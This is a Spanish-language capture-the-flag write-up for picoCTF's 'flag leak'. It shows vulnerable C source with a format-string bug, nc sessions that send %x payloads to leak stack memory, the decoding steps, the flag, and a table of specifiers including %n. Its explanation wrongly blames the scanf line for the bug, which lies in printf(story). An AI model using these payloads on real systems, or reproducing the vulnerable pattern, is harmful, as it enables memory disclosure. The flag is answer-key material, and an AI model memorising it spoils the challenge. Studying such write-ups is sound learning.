# flag leak

## Descripción
Clase de cuentos 1/2
Sólo copio y pego con este [programa](https://artifacts.picoctf.net/c/91/vuln). ¿Qué puede salir mal? Puedes ver la fuente [aquí](https://artifacts.picoctf.net/c/91/vuln.c). Y conectar con él usando:
`nc saturn.picoctf.net 57106`

## Pistas
- Formato de cadenas

## Solución
```bash
┌──(kali㉿kali)-[~/picoctf/b_exploitation/flagleak]
└─$ cat vuln.c                  
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
                                                                                                                
┌──(kali㉿kali)-[~/picoctf/b_exploitation/flagleak]
└─$ nc saturn.picoctf.net 55187
Tell me a story and then Ill tell you one >> %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%X
Heres a story - 
ffc09f00ffc09f2080493467825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825582578258048300f7fbc990ffc09f84f7fbcb50f7f88410110f7f884101f7fbc0008048338f7f80d20f7e05ab06F636970
                                                                                                                
┌──(kali㉿kali)-[~/picoctf/b_exploitation/flagleak]
└─$ nc saturn.picoctf.net 55187
Tell me a story and then Ill tell you one >> %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Heres a story - 
ffdbfe60ffdbfe808049346782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578252578256f6369707b4654436b34334c5f676e3167346c466666305f3474535f365f6b63306662347d666538fbad200013d4af000f7fc8990804c00080494100804c000ffdbff4880494182ffdbfff4ffdc00000ffdbff6000f7dbeed5
```

>[!solution]
>Primero, se tiene que analizar el código al hacer esto se obtiene una linea interesante `scanf("%127s", story);` en este caso se puede utilizar un format string attack, para lograrlo se introduce varias veces la cadena `%x` y se logró obtener una cadena hexadecimal que al usar la herramienta "Cyber Chef" para primero obtener una cadena ASCII y luego usar un Swap endianness para obtener la bandera.

## Bandera
picoCTF{L34k1ng_Fl4g_0ff_St4ck_64bf08ef}

## Notas adicionales
>[!danger]
>**Format string attack**
>Se produce cuando los datos enviados de una cadena de entrada son evaluados como un comando por la aplicación. De este modo, el atacante podría ejecutar código, leer la pila o provocar un fallo de segmentación en la aplicación en ejecución, causando nuevos comportamientos que podrían comprometer la seguridad o la estabilidad del sistema.

**Parámetros comunes utilizados en el format string attack**
| Parametros | Salida | Pasado como |
|--------|--------|--------|
| \%% | % carácter (literal) | Referencia |
| %p | Representación externa de un puntero a void | Referencia |
| %d | Decimal | Valor |
| %c | Carácter |  |
| %u | Decimal sin signo | Valor |
| %x | Hexadecimal | Valor |
| %s | Cadena | Referencia |
| %n | Escribe el número de caracteres en un puntero | Referencia |

>[!info]
>**Swap endianness**
>Cambia los datos de big-endian a little-endian o viceversa. Los datos pueden leerse en hexadecimal o en bytes brutos. Se devolverán en el mismo formato en que se introduzcan.

## Referencias
[CyberChef](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',4,true)From_Hex('Auto')&input=NmY2MzY5NzA3YjQ2NTQ0MzZiMzQzMzRjNWY2NzZlMzE2NzM0NmM0NjY2NjYzMDVmMzQ3NDUzNWYzNjVmNmI2MzMwNjY2MjM0N2Q2NjY1Mzg)
[Format string attack](https://owasp.org/www-community/attacks/Format_string_attack)
[C Input Output (I/O)](https://www.programiz.com/c-programming/c-input-output)